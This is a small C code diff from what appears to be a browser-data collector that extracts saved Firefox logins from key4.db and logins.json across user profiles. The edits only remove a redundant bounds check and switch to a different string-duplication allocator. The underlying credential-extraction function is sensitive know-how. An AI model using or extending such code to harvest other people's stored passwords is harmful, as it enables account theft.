@@ -294,7 +294,7 @@ static int bdb_find_bin_key(const uint8_t *data, size_t data_len,
     if (data_len < 64) return -1;
     uint32_t ps = be32(data + 12);
     if (ps < 512 || ps > 65536) return -1;
-    if (data_len < 0x3C) return -1;
+    /* ponytail: 0x3C=60, unreachable after data_len<64 check above; removed */
     uint32_t nb_key = be32(data + 0x38);
     if (nb_key == 0 || nb_key > 1000) return -1;
 
@@ -1074,8 +1074,8 @@ CollectResult collect_firefox(const char *roaming_app_data) {
             BrowserData *bd = &result.data[result.count];
             memset(bd, 0, sizeof(*bd));
 
-            bd->browser_name = strdup(browsers[b].name);
-            bd->profile_name = strdup(basename_of(profiles[p]));
+            bd->browser_name = mi_strdup(browsers[b].name);
+            bd->profile_name = mi_strdup(basename_of(profiles[p]));
 
             /* Extract logins (key4.db + logins.json) */
             bd->logins = firefox_extract_logins(profiles[p], &bd->login_count);
